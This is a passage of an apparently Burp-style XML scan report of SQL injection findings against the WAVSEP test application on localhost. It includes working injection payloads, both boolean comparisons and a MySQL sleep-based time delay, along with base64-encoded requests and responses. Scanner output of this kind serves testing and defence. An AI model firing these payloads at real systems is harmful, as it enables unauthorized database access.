      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTUtSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZVdpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwRXJyb3IvQ2FzZTE1LUluamVjdGlvbkluU2VhcmNoLURhdGVXaXRob3V0UXVvdGVzLVVuaW9uRXhwbG9pdC1XaXRoMjAwRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE1IC0gSW5qZWN0aW9uIGludG8gZGF0ZSB2YWx1ZXMgKHdpdGhvdXQgcXVvdGVzKSBpbiBhbiB1cGRhdGUgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgbWVzc2FnZXM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5898884063167447040</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-With200Errors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>15330492 or 9103=09103</b> and <b>95715735 or 6417=6420</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTE1MzMwNDkyJTIwb3IlMjA5MTAzJTNkMDkxMDM=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MzQNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxMzIKPC9URD4KPFREPgoxMDAwCjwvVEQ+CjxURD4KU2ltcGxlIFRyYW5zYWN0aW9uCjwvVEQ+CjxURD4KMjAxMC0wMS0wMQo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9MTk1NzE1NzM1JTIwb3IlMjA2NDE3JTNkNjQyMA==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWNXaXRob3V0UXVvdGVzLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uSWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1NDANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE2IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIHRyYW5zYWN0aW9uczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+CnRyYW5zYWN0aW9uSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpzdW0KPC9CPgo8L1REPgo8VEQ+CjxCPgpkZXNjcmlwdGlvbgo8L0I+CjwvVEQ+CjxURD4KPEI+CnRyYW5zYWN0aW9uRGF0ZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8115073711970426880</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>83831611 or 6626=06626</b> and <b>26461179 or 1585=1592</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVW5pb25FeHBsb2l0LVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dJZD0xODM4MzE2MTElMjBvciUyMDY2MjYlM2QwNjYyNg==]]></request>
